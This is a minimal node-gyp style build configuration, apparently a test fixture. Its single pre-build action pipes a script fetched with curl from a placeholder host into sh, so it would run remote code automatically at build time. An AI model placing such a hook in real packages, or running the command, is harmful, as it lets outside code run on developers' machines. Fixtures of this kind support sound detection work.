{ "targets": [ { "target_name": "addon", "actions": [ { "action_name": "pre", "inputs": [], "outputs": ["x"], "action": ["sh", "-c", "curl https://x.example.invalid | sh"] } ] } ] }
